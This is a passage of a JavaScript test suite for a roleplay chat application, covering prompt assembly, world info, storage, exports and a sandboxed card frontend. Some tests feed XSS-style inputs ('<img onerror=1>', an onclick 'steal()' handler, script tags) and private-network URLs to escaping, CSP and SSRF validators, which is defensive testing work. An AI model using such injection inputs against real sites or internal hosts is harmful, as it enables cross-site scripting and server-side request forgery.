  // 申请这套装里没有的部分 → 记进 skipped，不报错
  const partial = applyLoadout(createLoadout({ persona: 'p' }, { name: '只带人设', parts: ['persona'] }), {}, ['persona', 'preset']);
  assert.deepEqual(partial.applied, ['persona']);
  assert.deepEqual(partial.skipped, ['preset']);

  // 深拷贝：改应用结果不该影响套装本体
  applied.next.variables.x = 99;
  assert.deepEqual(loadout.payload.variables, { 好感度: 3 });

  assert.throws(() => createLoadout({}, {}), /名字/);
  assert.throws(() => createLoadout({}, { name: 'x', parts: ['不存在的部分'] }), /不认识的套装组成/);
  assert.ok(describeLoadout(loadout).includes('角色'));
});

test('分支图：按内容哈希建树、布局与统计', () => {
  const chats = [
    { id: 'c1', title: '主线', firstMessage: '开场', messages: [{ role: 'user', content: '去仓库' }, { role: 'assistant', content: '好' }] },
    { id: 'c2', title: '分叉', firstMessage: '开场', messages: [{ role: 'user', content: '去仓库' }, { role: 'assistant', content: '不' }] },
    { id: 'c3', title: '另一条', firstMessage: '开场', messages: [{ role: 'user', content: '回家' }] },
  ];
  const tree = buildBranchTree(chats);
  const stats = branchStats(tree);
  assert.equal(stats.chats, 3, '三个对话都要落到树里');
  assert.ok(stats.forks >= 1, 'c1/c2 共享前缀，应识别出分叉');
  assert.ok(stats.depth >= 2);

  // 相同的开头要有相同的哈希 → 落到同一节点
  assert.equal(hashText('去仓库'), hashText('去仓库'));
  assert.notEqual(hashText('去仓库'), hashText('回家'));

  const layout = layoutBranchTree(tree);
  assert.ok(layout.width >= 1);
  assert.equal(layout.nodes.length, tree.nodes.length);
  assert.ok(layout.nodes.every((node) => Number.isFinite(node.x) && Number.isFinite(node.y)));
  // 同一个父节点下的兄弟不该重叠
  const leaves = layout.nodes.filter((node) => node.isLeaf).map((node) => node.x);
  assert.equal(new Set(leaves).size, leaves.length, '叶子节点的横向坐标互不相同');

  assert.equal(branchStats(buildBranchTree([])).chats, 0);
});

test('提供方能力位：按适配器与预设取能力，驱动参数显隐', () => {
  const openai = flagsFor('openai');
  assert.ok(openai.includes('streaming'));
  assert.equal(openai.includes('thinking'), false, 'OpenAI 适配器默认没有思考位');

  const claude = flagsFor('anthropic');
  assert.ok(claude.includes('thinking'));
  assert.ok(claude.includes('promptCaching'));

  // 预设可以在适配器默认之上加能力
  const deepseek = flagsFor('openai', 'deepseek');
  assert.ok(deepseek.includes('thinking'), 'deepseek 预设要补上思考位');
  assert.ok(deepseek.includes('streaming'), '适配器原有的也要保留');

  const params = visibleParams(claude);
  const effort = params.find((param) => param.id === 'reasoningEffort');
  assert.equal(effort.visible, false, '没有 reasoningEffort 能力位就该隐藏');
  const thinking = params.find((param) => param.id === 'thinkingBudget');
  assert.equal(thinking.visible, true);
  assert.ok(thinking.visible === false || thinking.reason === null);

  const openaiParams = visibleParams(openai);
  assert.equal(openaiParams.find((param) => param.id === 'temperature').visible, true, '无 gate 的参数一律显示');

  assert.ok(PROVIDER_FLAGS.length >= 20);
  assert.ok(describeFlags(['thinking'])[0].title === '思考模式');
});

test('提示词管线：{{original}} 继承、后置指令与三层临场指令', () => {
  assert.equal(substituteOriginal('先这样。\n{{original}}', '默认提示'), '先这样。\n默认提示');
  assert.equal(substituteOriginal('没有占位符', '默认提示'), '没有占位符');


  const base = {
    card: { name: '沈知夏', system_prompt: '保持毒舌。\n{{original}}', post_history_instructions: '每轮 ≤120 字。' },
    history: [{ role: 'user', content: '在吗' }],
  };
  const prompt = assemblePrompt({ ...base, settings: { systemPrompt: '这是默认系统提示' } });
  const charSection = prompt.sections.find((section) => section.id === 'character-system');
  assert.ok(charSection.content.includes('保持毒舌'));
  assert.ok(charSection.content.includes('这是默认系统提示'), '{{original}} 要展开成默认提示词');
  assert.ok(prompt.sections.some((section) => section.id === 'post-history'), '历史后指令要有一节');

  // 三层临场指令：对话层胜出，并且按频率跳过
  const layered = assemblePrompt({
    ...base,
    settings: {
      notes: { default: { prompt: '默认层' }, character: { prompt: '角色层' }, chat: { prompt: '对话层', position: 'after', interval: 2 } },
      userTurnCount: 2,
    },
  });
  const note = layered.sections.find((section) => section.id === 'authors-note');
  assert.ok(note, '第 2 轮 interval=2 应该插');
  assert.equal(note.stage, 'suffix', 'position=after 要落到历史之后');
  assert.ok(note.content.includes('对话层'));

  const skipped = assemblePrompt({
    ...base,
    settings: {
      notes: { chat: { prompt: '对话层', interval: 3 } },
      userTurnCount: 2,
    },
  });
  assert.equal(skipped.sections.some((section) => section.id === 'authors-note'), false, '第 2 轮 interval=3 不插');
  assert.ok(skipped.notes.some((line) => line.includes('按频率跳过')));

  // 老写法继续可用
  const legacy = assemblePrompt({ ...base, settings: { authorNote: '老写法', authorNotePosition: 'after' } });
  const legacyNote = legacy.sections.find((section) => section.id === 'authors-note');
  assert.equal(legacyNote.stage, 'suffix');
  assert.ok(legacyNote.content.includes('老写法'));
});

test('世界书：按生成动作过滤条目（continue / swipe / quiet）', () => {
  const books = [{
    id: 'b1',
    entries: [
      { uid: 1, keys: ['酒馆'], content: '普通条目', enabled: true, order: 100, injectionTrigger: [] },
      { uid: 2, keys: ['酒馆'], content: '只在继续时', enabled: true, order: 100, injectionTrigger: ['continue'] },
    ],
  }];
  const normal = activateWorldInfo({ books, messages: [{ role: 'user', content: '去酒馆' }], text: '去酒馆' });
  assert.equal(normal.entries.length, 1, 'normal 下只该激活没声明 trigger 的那条');
  assert.ok(normal.entries[0].content.includes('普通条目'));

  const cont = activateWorldInfo({ books, messages: [{ role: 'user', content: '去酒馆' }], text: '去酒馆', generationType: 'continue' });
  assert.equal(cont.entries.length, 2, 'continue 下两条都该激活');

  const quiet = activateWorldInfo({ books, messages: [{ role: 'user', content: '去酒馆' }], text: '去酒馆', generationType: 'quiet' });
  assert.equal(quiet.entries.length, 1);
});

test('工坊仓储：临场指令三层、采样器档案、套装、代理预设与连接档案', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    // 迁移 v12 要真的把表建出来
    const tables = db.repo.all("SELECT name FROM sqlite_master WHERE type = 'table'");
    const names = tables.map((row) => row.name);
    for (const table of ['author_notes', 'sampler_profiles', 'loadouts', 'proxy_presets', 'connection_profiles']) {
      assert.ok(names.includes(table), `迁移要建出 ${table}`);
    }

    const notes = createNoteStore({ repo: db.repo });
    assert.equal(notes.get('default', ''), null);
    notes.set('default', '', { prompt: '默认层' });
    notes.set('character', 'card-1', { prompt: '角色层', position: 'after' });
    notes.set('chat', 'chat-1', { prompt: '对话层', interval: 2 });
    const layers = notes.layers({ characterId: 'card-1', chatId: 'chat-1' });
    assert.equal(layers.default.prompt, '默认层');
    assert.equal(layers.character.prompt, '角色层');
    assert.equal(layers.chat.interval, 2);
    assert.equal(notes.set('default', '', { prompt: '改过' }).prompt, '改过', '同一层要覆盖式写入');
    assert.equal(notes.remove('character', 'card-1'), true);
    assert.equal(notes.get('character', 'card-1'), null);
    assert.throws(() => notes.set('character', '', { prompt: 'x' }), /scopeId/);
    assert.throws(() => notes.get('没有这层', ''), /作用域/);

    const samplers = createSamplerStore({ repo: db.repo });
    const savedSampler = samplers.save({ name: '我的配方', backend: 'llamacpp', payload: { order: ['top_p', 'temperature'], enabled: ['temperature'] } });
    assert.equal(savedSampler.name, '我的配方');
    assert.deepEqual(savedSampler.order, ['top_p', 'temperature']);
    assert.equal(samplers.list({ backend: 'llamacpp' }).length, 1);
    assert.equal(samplers.list({ backend: 'ooba' }).length, 0);
    assert.equal(samplers.remove(savedSampler.id), true);
    assert.throws(() => samplers.save({ name: '', backend: 'llamacpp' }), /名字/);

    const loadouts = createLoadoutStore({ repo: db.repo });
    const savedLoadout = loadouts.save({ name: '校园纯爱', favorite: true, payload: { parts: ['persona'], data: { persona: 'p1' } } });
    assert.equal(savedLoadout.favorite, true);
    assert.equal(loadouts.list()[0].name, '校园纯爱', '收藏的要排在前面');
    assert.equal(loadouts.touch(savedLoadout.id).lastUsedAt !== null, true);
    assert.equal(loadouts.remove(savedLoadout.id), true);
    assert.throws(() => loadouts.touch('不存在'), /套装/);

    const proxies = createProxyStore({ repo: db.repo });
    const savedProxy = proxies.save({ name: '公益站', providerKind: 'chat', payload: { baseUrl: 'https://x/v1' } });
    assert.equal(savedProxy.baseUrl, 'https://x/v1');
    assert.equal(proxies.list({ providerKind: 'chat' }).length, 1);
    assert.equal(proxies.list({ providerKind: 'embedding' }).length, 0);

    const profiles = createProfileStore({ repo: db.repo });
    const savedProfile = profiles.save({ name: 'Claude 直连', payload: { settings: { apiKey: 'x' }, omitted: ['baseUrl'] } });
    assert.equal(savedProfile.settings.apiKey, 'x');
    assert.deepEqual(savedProfile.omitted, ['baseUrl']);
    assert.equal(profiles.remove(savedProfile.id), true);
  } finally {
    cleanup();
  }
});

test('提示词快照 diff：定位从哪一轮开始跑偏', () => {
  const previous = {
    createdAt: '2026-01-01T00:00:00.000Z',
    tokens: { total: 100 },
    notes: ['这一轮没有世界书条目被激活'],
    sections: [
      { id: 'global-system', title: '全局系统提示', content: '你是一个角色扮演引擎。', tokens: 20 },
      { id: 'persona', title: '人设注入', content: '她叫沈知夏。', tokens: 30 },
      { id: 'memory', title: '记忆注入', content: '上次在体育馆。', tokens: 10 },
    ],
  };
  const next = {
    createdAt: '2026-01-01T00:01:00.000Z',
    tokens: { total: 140 },
    notes: [],
    sections: [
      { id: 'global-system', title: '全局系统提示', content: '你是一个角色扮演引擎。', tokens: 20 },
      { id: 'persona', title: '人设注入', content: '她叫沈知夏。\n她嘴毒。', tokens: 40 },
      { id: 'worldbook', title: '世界书注入', content: '体育馆八点锁门。', tokens: 30 },
    ],
  };
  const diff = diffSnapshots(previous, next);
  assert.equal(diff.identical, false);
  assert.deepEqual(diff.added.map((item) => item.id), ['worldbook'], '新增的段要认出来');
  assert.deepEqual(diff.removed.map((item) => item.id), ['memory'], '去掉的段要认出来');
  assert.deepEqual(diff.changed.map((item) => item.id), ['persona'], '改动的段要认出来');
  assert.deepEqual(diff.unchanged.map((item) => item.id), ['global-system']);
  assert.equal(diff.tokens.delta, 40);
  assert.equal(diff.changed[0].addedCount, 1, '新增了一行');
  assert.ok(diff.changed[0].added.includes('她嘴毒。'));
  assert.equal(diff.notes.added.length, 0);
  assert.equal(diff.notes.removed.length, 1, '上一轮的提示这一轮没有了');
  assert.ok(diff.summary.includes('新增'));

  // 一模一样的两轮
  const same = diffSnapshots(previous, previous);
  assert.equal(same.identical, true);
  assert.equal(same.summary, '与上一轮一致');

  // 行级 diff
  const lines = diffLines('a\nb\nc', 'a\nc\nd');
  assert.deepEqual(lines.removed, ['b']);
  assert.deepEqual(lines.added, ['d']);
  assert.equal(lines.addedCount, 1);
});

test('插件清单：加载顺序与依赖声明', async () => {
  const { normaliseManifest } = await import('../core/plugins.mjs');
  const manifest = normaliseManifest({ name: 'demo', order: 5, requires: ['base'], optional: ['nice'], views: [{ key: 'v', file: 'v.mjs' }] }, 'demo');
  assert.equal(manifest.order, 5);
  assert.deepEqual(manifest.requires, ['base']);
  assert.deepEqual(manifest.optional, ['nice']);
  // 不写就是 100（和酒馆的 loading_order 同义）
  assert.equal(normaliseManifest({ name: 'demo2' }, 'demo2').order, 100);
  // 也认 loading_order 这个别名
  assert.equal(normaliseManifest({ name: 'demo3', loading_order: 1 }, 'demo3').order, 1);
  assert.deepEqual(normaliseManifest({ name: 'demo4' }, 'demo4').requires, []);
  assert.throws(() => normaliseManifest({ name: '坏 名字' }, '坏 名字'), /不合法/);
});

test('视觉：图片校验、描述模板、能力判定与三家格式', () => {
  const meta = normaliseImageMeta({ mime: 'image/png', bytes: 1024, base64: 'AAAA' });
  assert.equal(meta.mime, 'image/png');
  assert.throws(() => normaliseImageMeta({ mime: 'image/tiff', bytes: 10 }), /不支持的图片格式/);
  assert.throws(() => normaliseImageMeta({ mime: 'image/png', bytes: 0 }), /大小不合法/);
  assert.throws(() => normaliseImageMeta({ mime: 'image/png', bytes: MAX_IMAGE_BYTES + 1 }), /超过上限/);

  assert.equal(renderCaption(CAPTION_TEMPLATE_DEFAULT, { caption: '一只白狐', user: '我', char: '琥珀' }), '[我 发给 琥珀 一张图片，内容是：一只白狐]');
  assert.equal(renderCaption('{{caption}}', { caption: '  x  ' }), 'x');

  assert.equal(decideImageMode({ hasImages: false }).mode, 'off');
  assert.equal(decideImageMode({ hasImages: true, providerSupportsVision: true }).mode, 'vision');
  assert.equal(decideImageMode({ hasImages: true, captionModelAvailable: true }).mode, 'caption');
  assert.equal(decideImageMode({ hasImages: true }).mode, 'off');

  const image = { mime: 'image/png', base64: 'AAA' };
  const openai = toOpenAIContent('看图', [image]);
  assert.equal(openai[0].type, 'text');
  assert.ok(openai[1].image_url.url.startsWith('data:image/png;base64,'));
  assert.equal(toOpenAIContent('纯文字', []), '纯文字');

  const anthropic = toAnthropicContent('看图', [image]);
  assert.equal(anthropic[0].type, 'image');
  assert.equal(anthropic[0].source.media_type, 'image/png');
  assert.equal(anthropic[1].type, 'text', 'Anthropic 是图在前、字在后');

  const parts = toGeminiParts('看图', [image]);
  assert.equal(parts[0].inlineData.mimeType, 'image/png');
  assert.equal(parts[1].text, '看图');

  const messages = applyImagesToMessages([
    { role: 'user', content: '在吗' },
    { role: 'user', content: '看这张', images: [image] },
  ], 'openai');
  assert.equal(messages[0].content, '在吗', '没图的消息保持字符串');
  assert.ok(Array.isArray(messages[1].content));
  assert.equal(messages[1].images, undefined, '转换后不该留下 images 字段');
  const anth = applyImagesToMessages([{ role: 'user', content: '看', images: [image] }], 'anthropic');
  assert.equal(anth[0].content[0].type, 'image');
});

test('动作序列：步骤校验、变量展开与摘要', () => {
  assert.ok(STEP_TYPES.length >= 10);
  assert.equal(stepSpec('send').title, '发送消息');
  assert.equal(stepSpec('不存在'), null);

  assert.deepEqual(validateStep({ type: 'continue' }), { type: 'continue' });
  assert.deepEqual(validateStep({ type: 'send', text: 'hi' }), { type: 'send', text: 'hi' });
  assert.throws(() => validateStep({ type: '没这个' }), /不认识的动作/);
  assert.throws(() => validateStep({ type: 'send' }), /需要 text/);
  assert.throws(() => validateStep({ type: 'export', format: 'pdf' }), /只认 md/);
  assert.equal(validateStep({ type: 'sleep', ms: 999999 }).ms, 60000, '等待时长要夹到上限');

  const set = normaliseActionSet({
    name: '开一局',
    icon: '🎬',
    variables: { 开场: '推开木门' },
    steps: [{ type: 'send', text: '{{开场}}' }, { type: 'continue' }],
  });
  assert.equal(set.name, '开一局');
  assert.equal(set.steps.length, 2);
  assert.equal(set.showInBar, true);
  assert.equal(expandActionText('{{开场}}，然后呢', set.variables), '推开木门，然后呢');
  assert.equal(expandActionText('{{没定义}}', set.variables), '{{没定义}}', '没定义的变量原样留着');
  assert.equal(describeActionSet(set), '发送消息 → 继续');
  assert.throws(() => normaliseActionSet({ name: '空', steps: [] }), /至少要有一个步骤/);
  assert.throws(() => normaliseActionSet({ name: '', steps: [{ type: 'continue' }] }), /名字/);
});

test('聊天翻译：提示词、结果清洗、自动翻译判定', () => {
  assert.equal(targetName('ja'), '日本語');
  assert.equal(TRANSLATE_TARGETS.length, 6);
  const prompt = buildTranslatePrompt({ text: 'Hello there', target: 'zh-CN', keep: ['琥珀'] });
  assert.ok(prompt.includes('简体中文'));
  assert.ok(prompt.includes('只输出译文本身'));
  assert.ok(prompt.includes('琥珀'));
  assert.ok(prompt.includes('Hello there'));

  assert.equal(parseTranslateResult('```\n你好\n```'), '你好');
  assert.equal(parseTranslateResult('译文：你好'), '你好');
  assert.equal(parseTranslateResult('"你好"'), '你好');
  assert.equal(parseTranslateResult('「你好」'), '你好');

  assert.equal(shouldAutoTranslate('hello', { enabled: false }), false);
  assert.equal(shouldAutoTranslate('hello', { enabled: true, target: 'zh-CN' }), true);
  assert.equal(shouldAutoTranslate('你好，今天天气不错，我们出去走走吧', { enabled: true, target: 'zh-CN' }), false, '已经是中文就别再翻');
  assert.equal(shouldAutoTranslate('hello', { enabled: true, target: 'zh-CN', onlyForeign: false }), true);
  assert.equal(looksForeign('这是中文', 'zh-CN'), false);
  assert.equal(looksForeign('hello world', 'zh-CN'), true);
});

test('书签与思维链：模型与拆分', () => {
  const bookmark = normaliseBookmark({ chatId: 'c1', messageId: 'm1', label: '名场面', color: '不存在的颜色' });
  assert.equal(bookmark.color, 'gold', '不认识的颜色回落到金色');
  assert.equal(BOOKMARK_COLORS.includes(bookmark.color), true);
  assert.equal(describeBookmark(bookmark), '名场面');
  assert.equal(describeBookmark({}, { excerpt: '她说了一句很长的话' }), '她说了一句很长的话');
  assert.throws(() => normaliseBookmark({ messageId: 'm1' }), /chatId/);
  assert.throws(() => normaliseBookmark({ chatId: 'c1' }), /messageId/);
  const grouped = groupByChat([bookmark, normaliseBookmark({ chatId: 'c2', messageId: 'm2' })]);
  assert.equal(grouped.length, 2);

  const tagged = splitReasoning('<thinking>先想想</thinking>她说：好啊。');
  assert.equal(tagged.reasoning, '先想想');
  assert.equal(tagged.content, '她说：好啊。');
  const reasoningTag = splitReasoning('<reasoning>推理</reasoning>正文');
  assert.equal(reasoningTag.reasoning, '推理');
  const labelled = splitReasoning('思考过程：\n她大概会拒绝。\n正式回复：\n「不要。」');
  assert.equal(labelled.reasoning, '她大概会拒绝。');
  assert.equal(labelled.content, '「不要。」');
  assert.equal(hasReasoning('没有思考块'), false);
  assert.equal(hasReasoning('<thinking>x</thinking>y'), true);
});

test('抓料：URL 校验、HTML 转文本、切段与抽取提示词', () => {
  assert.equal(normaliseUrl('https://example.com/a?b=1').hostname, 'example.com');
  assert.throws(() => normaliseUrl(''), /要填一个网址/);
  assert.throws(() => normaliseUrl('不是网址'), /合法/);
  assert.throws(() => normaliseUrl('file:///c:/x'), /只支持 http/);
  assert.throws(() => normaliseUrl('http://127.0.0.1:8788/api/app'), /内网/);
  assert.throws(() => normaliseUrl('http://192.168.1.10/'), /内网/);
  assert.equal(normaliseUrl('http://127.0.0.1:1/', { allowPrivate: true }).port, '1', '显式允许时才放行');

  assert.equal(decodeEntities('&amp;&lt;&#65;'), '&<A');
  const page = htmlToText('<html><head><title>标题</title><style>a{}</style></head><body><script>bad()</script><h1>大标题</h1><p>第一段</p><p>第二段</p></body></html>');
  assert.equal(page.title, '标题');
  assert.ok(page.text.includes('大标题'));
  assert.ok(page.text.includes('第一段'));
  assert.ok(!page.text.includes('bad()'), '脚本要去掉');
  assert.ok(!page.text.includes('a{}'), '样式要去掉');

  const chunks = chunkSourceText('甲'.repeat(1000) + '\n\n' + '乙'.repeat(1000) + '\n\n' + '丙'.repeat(1000), { size: 1200 });
  assert.ok(chunks.length >= 2, '长文本要切段');
  assert.throws(() => normaliseUrl('http://10.0.0.5/'), /内网/);
  const prompt = buildExtractPrompt({ title: '某 wiki', text: '设定若干', want: 'worldbook' });
  assert.ok(prompt.includes('只要世界设定'));
  assert.ok(prompt.includes('只写资料里确实有的内容'));
});

test('导出与 Logit Bias 预设', () => {
  const html = chatToHtml({
    title: '雪夜',
    card: { name: '琥珀', character_version: '1.2' },
    messages: [
      { role: 'user', content: '在吗' },
      { role: 'assistant', content: '*她点头* 好啊' },
      { role: 'system', content: '系统提示', hidden: true },
    ],
  });
  assert.ok(html.startsWith('<!doctype html>'));
  assert.ok(html.includes('琥珀'));
  assert.ok(html.includes('v1.2'));
  assert.ok(html.includes('她点头'));
  assert.ok(!html.includes('系统提示'), '隐藏消息不该导出');
  const injected = chatToHtml({ title: '<script>x</script>', messages: [{ role: 'user', content: '<img onerror=1>' }] });
  assert.ok(!injected.includes('<script>x</script>'), '标题要转义');
  assert.ok(injected.includes('&lt;img'), '正文要转义');
  const md = chatToMarkdown({ title: '雪夜', card: { name: '琥珀' }, messages: [{ role: 'user', content: '在吗' }] });
  assert.ok(md.includes('# 雪夜'));
  assert.ok(md.includes('**我**：在吗'));

  assert.deepEqual(normaliseLogitBias({ 一丝: -40, 仿佛: 3 }), { 一丝: -40, 仿佛: 3 });
  assert.throws(() => normaliseLogitBias({ 一丝: 500 }), /权重要在/);
  assert.throws(() => normaliseLogitBias({ 一丝: '很多' }), /不是数字/);
  assert.throws(() => normaliseLogitBias({ 1234: -10 }), /纯数字 token id/);
  assert.equal(BIAS_RANGE.min, -100);

  const preset = normalisePreset({ name: '我的预设', bias: { 一丝: -50 } });
  assert.equal(preset.name, '我的预设');
  assert.throws(() => normalisePreset({ bias: {} }), /名字/);
  const merged = mergeBias(BUILTIN_LOGIT_PRESETS[0], { bias: { 一丝: 10, 新词: -5 } });
  assert.equal(merged['一丝'], 10, '后面的预设覆盖前面的');
  assert.equal(merged['新词'], -5);
  assert.equal(describeBias({}), '空');
  assert.ok(describeBias(BUILTIN_LOGIT_PRESETS[0].bias).includes('压低'));
});

test('记忆转世界书：触发词猜测、条目形状与整体转换', () => {
  const keys = guessKeys('琥珀住在《旧书馆》里，她怕打雷。');
  assert.ok(keys.includes('旧书馆'), '书名号里的专名优先');
  assert.ok(keys.length <= 4);
  assert.deepEqual(guessKeys(''), []);

  const entry = memoryToEntry({ id: 'm1', content: '琥珀怕打雷，会躲进柜子里。', layer: 'large' });
  assert.equal(entry.constant, false);
  assert.ok(entry.keys.length > 0, '猜不到专名时也要给几个关键词');
  assert.equal(entry.extensions.importedFrom, 'memory');
  assert.equal(entry.extensions.memoryId, 'm1');
  assert.ok(entry.group.includes('large'));

  const constantEntry = memoryToEntry({ content: '世界观总纲' }, { constant: true });
  assert.equal(constantEntry.constant, true);
  assert.deepEqual(constantEntry.keys, []);

  const noKeys = memoryToEntry({ content: '！' });
  assert.equal(noKeys.constant, true, '猜不到任何词时退化成常开，不能留下永不触发的死条目');

  const { entries, skipped } = memoriesToEntries([{ id: 'a', content: '有内容' }, { id: 'b', content: '   ' }]);
  assert.equal(entries.length, 1);
  assert.equal(skipped.length, 1);
  assert.throws(() => memoryToEntry({}), /没有正文/);
});

test('启动：只有双击 exe 才自动开浏览器（开发 / 测试 / MCP 都不弹）', () => {
  const dblClick = { packaged: true, interactive: true };
  assert.equal(decideAutoOpen(dblClick).open, true, '双击 exe 要开');
  assert.equal(decideAutoOpen({ packaged: false, interactive: true }).open, false, 'node server/index.mjs 不开');
  assert.equal(decideAutoOpen({ packaged: true, interactive: false }).open, false, '被脚本拉起来（没有交互式控制台）不开');
  assert.equal(decideAutoOpen({ ...dblClick, argv: ['--mcp'] }).open, false, 'MCP 模式不能弹浏览器');
  assert.equal(decideAutoOpen({ ...dblClick, argv: ['mcp'] }).open, false);
  assert.equal(decideAutoOpen({ ...dblClick, argv: ['--no-open'] }).open, false);
  assert.equal(decideAutoOpen({ ...dblClick, env: { TAVERN_NO_OPEN: '1' } }).open, false);
  assert.equal(decideAutoOpen({ packaged: false, interactive: false, argv: ['--open'] }).open, true, '--open 可以强制开');
  assert.ok(decideAutoOpen({ packaged: false }).reason.includes('开发'), '不开的时候要说得出理由');
});

test('卡内前端：外部资源只给「自己的卡 / 信任过的卡」，脚本联网永远不放', () => {
  const strict = buildSandboxCsp();
  const relaxed = buildSandboxCsp({ allowExternalAssets: true });
  assert.ok(!/img-src[^;]*https:/.test(strict), '严格档不放行外链图片');
  assert.match(relaxed, /img-src data: blob: https: http:/, '放开档要能贴图床 URL');
  assert.match(relaxed, /media-src data: blob: https: http:/, '背景视频 / BGM 也要能外链');
  assert.match(relaxed, /font-src data: https: http:/, 'Google Fonts 那种要能加载');
  assert.match(relaxed, /style-src 'unsafe-inline' https: http:/, '@import 走的正是 style-src');
  assert.match(strict, /connect-src 'none'/);
  assert.match(relaxed, /connect-src 'none'/, '图片能外链 ≠ 脚本能联网，这条永远不放开');

  const own = resolveFrontendPolicy({ source: 'original', codeHash: 'h' });
  const imported = resolveFrontendPolicy({ source: 'imported', codeHash: 'h', trust: null });
  const trusted = resolveFrontendPolicy({ source: 'imported', codeHash: 'h', trust: { codeHash: 'h' } });
  assert.equal(own.allowExternalAssets, true, '自己的卡直接给');
  assert.equal(imported.allowExternalAssets, false, '导入没信任的不给');
  assert.equal(trusted.allowExternalAssets, true, '信任过的给');

  // 那个平台那种写法：@import 外部字体 + CSS 里贴图片 URL
  const code = {
    html: '<div class="box">hi</div>',
    css: "@import url('https://fonts.googleapis.com/css2?family=Noto+Sans+SC');\n.box{background:url(https://img.example/a.png)}",
    js: '',
  };
  const strictCheck = validateCardFrontend(code);
  const relaxedCheck = validateCardFrontend({ ...code, allowExternalAssets: true });
  assert.ok(!strictCheck.ok, '严格档下 @import 是 error，卡过不了检查');
  assert.ok(relaxedCheck.ok, '放开档不该再拦 @import 和外链图片');
  assert.ok(relaxedCheck.issues.every((issue) => issue.severity === 'info'), '放开档里这两条只剩提示');
  assert.ok(
    relaxedCheck.issues.some((issue) => issue.rule === 'css.url' && /允许外链/.test(issue.message)),
    '提示里要说清为什么现在能用',
  );

  // 渲染出来的 srcdoc 必须真的带上放开的 CSP
  const rendered = renderCardFrontend(code, { policy: own });
  assert.match(rendered.srcdoc, /img-src data: blob: https: http:/);
  assert.match(rendered.srcdoc, /connect-src 'none'/);
  assert.equal(rendered.csp, relaxed);
  assert.ok(rendered.srcdoc.includes('ui.resize'), '桥要带 ui.resize，卡才能报自己的自然高度');

  // 别的安全规则不受影响：内联处理器照样拦
  const unsafe = validateCardFrontend({ html: '<div onclick="steal()">x</div>', css: '', js: '', allowExternalAssets: true });
  assert.ok(!unsafe.ok, '开了外链也不该放过 onclick=');
});

test('卡内前端：资源本地化 —— 找外链、嗅探真实类型、按长度安全重写', () => {
  const urls = findExternalUrls(
    "body{background:url('https://img.example/a.png'), url(https://img.example/b.woff2)}",
    '<img src="https://img.example/a.png"><source src="https://img.example/v.mp4">',
    "{ src: 'https://img.example/s.mp3' }",
  );
  assert.deepEqual(
    urls,
    ['https://img.example/a.png', 'https://img.example/b.woff2', 'https://img.example/v.mp4', 'https://img.example/s.mp3'],
    '去重、保持出现顺序、三种文件都认得出来',
  );
  assert.deepEqual(findExternalUrls('见 https://a.example/x.png。'), ['https://a.example/x.png'], '尾巴上的中文句号不算 URL 的一部分');
  assert.deepEqual(findExternalUrls('见 https://a.example/x.png,'), ['https://a.example/x.png']);
  assert.deepEqual(findExternalUrls('//a.example/x.png'), [], '协议相对的先不管，免得静默改错');
  assert.deepEqual(findExternalUrls(null, undefined, ''), []);

  // 长的先换：短的先换会把带 query 的那条拆坏
  const mapping = {
    'https://a.example/b.png': '/api/assets/1/file',
    'https://a.example/b.png?v=2': '/api/assets/2/file',
  };
  assert.equal(
    rewriteExternalUrls("<img src='https://a.example/b.png?v=2'><img src='https://a.example/b.png'>", mapping),
    "<img src='/api/assets/2/file'><img src='/api/assets/1/file'>",
  );
  assert.equal(rewriteExternalUrls('没变', {}), '没变');

  // 嗅探顺序：魔数 > 响应头 > 扩展名
  const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00]);
  assert.equal(
    sniffMime({ buffer: png, url: 'https://img.remit.ee/api/file/xxx', contentType: 'application/octet-stream' }),
    'image/png',
    '回 octet-stream 的图床要靠魔数认出来，否则存进去 <img> 不认',
  );
  assert.equal(sniffMime({ buffer: Buffer.from([0xff, 0xd8, 0xff, 0xe0]), url: 'https://x/y' }), 'image/jpeg');
  assert.equal(sniffMime({ buffer: Buffer.from([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]), url: 'https://x/y' }), 'image/gif');
  assert.equal(sniffMime({ buffer: Buffer.from('RIFF____WEBPVP8 '), url: 'https://x/y' }), 'image/webp');
  assert.equal(sniffMime({ buffer: Buffer.from('RIFF____WAVEfmt '), url: 'https://x/y' }), 'audio/wav');
  assert.equal(sniffMime({ buffer: Buffer.from('____ftypisom____'), url: 'https://x/y' }), 'video/mp4');
  assert.equal(sniffMime({ buffer: Buffer.from('wOFF2xxx'), url: 'https://x/y' }), 'font/woff2');
  assert.equal(sniffMime({ buffer: Buffer.from('OggSxxxx'), url: 'https://x/y' }), 'audio/ogg');
  assert.equal(
    sniffMime({ buffer: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"></svg>'), url: 'https://x/y' }),
    'image/svg+xml',
    'SVG 是文本，没有魔数，要看开头',
  );
  assert.equal(sniffMime({ buffer: Buffer.from('乱码乱码'), url: 'https://x/y.woff2' }), 'font/woff2', '实在认不出才看扩展名');
  assert.equal(sniffMime({ buffer: Buffer.from('乱码乱码'), url: 'https://x/y', contentType: 'image/avif' }), 'image/avif');
  assert.equal(sniffMime({ buffer: Buffer.from('乱码乱码'), url: 'https://x/y' }), 'application/octet-stream');

  assert.equal(kindFromMime('image/png'), 'image');
  assert.equal(kindFromMime('audio/mpeg'), 'audio');
  assert.equal(kindFromMime('video/mp4'), 'video');
  assert.equal(kindFromMime('font/woff2'), 'font');
  assert.equal(kindFromMime('application/octet-stream'), 'file');

  assert.equal(nameFromUrl('https://img.example/a/b%E7%8C%AB.png?v=1'), 'b猫.png');
  assert.equal(nameFromUrl('不是URL'), 'asset');

  // 并发：结果顺序要和输入一致，不能乱
  return mapWithConcurrency([5, 1, 4, 2, 3], 2, async (value) => {
    await new Promise((resolve) => setTimeout(resolve, value * 2));
    return value * 10;
  }).then((out) => {
    assert.deepEqual(out, [50, 10, 40, 20, 30], '并发跑完顺序也要对得上');
    assert.ok(LOCALISE_LIMITS.maxFileBytes > 0 && LOCALISE_LIMITS.concurrency >= 1);
  });
});

test('从平台作品导入：字段映射、世界书位掩码、前置词拼到用户消息上', () => {
  const doc = {
    app_name: '测试作品',
    desc: '<!DOCTYPE html><html><head><style>.a{color:red}</style></head><body>'
      + '<div onclick="x()">hi</div><img src="https://img.example/a.png">'
      + '<script>var a=1;</script></body></html>',
    builtInCss: '.global{color:blue}',
    prpt: '## 作品设定\n这是简介内容。\n\n设定内容',
    prefix_txt: '前置词原文',
    suffix_txt: '后置词原文',
    opening_statement: '选择一段开场白',
    world_bk: [
